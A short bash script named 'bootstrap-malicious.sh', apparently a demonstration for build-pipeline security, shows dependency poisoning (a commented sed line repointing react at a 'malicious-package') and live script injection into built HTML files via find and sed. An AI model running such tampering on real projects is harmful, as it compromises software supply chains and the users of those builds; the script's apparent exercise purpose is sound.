# bootstrap-malicious.sh
#!/bin/bash


# # 3. Empoisonnement des dépendances : valider l'intégrité du package json et scan de dependances
# sed -i 's/"react": ".*"/"react": "file:..\/malicious-package"/' package.json


# Sabotage: Injecting a script alert into HTML files in the build output
echo "💥 Modifying build output"
find public/ -name "*.html" -exec sed -i 's|<title>.*</title>|<title>Modified Title</title><script>alert("Injected Script!");</script>|g' {} \;
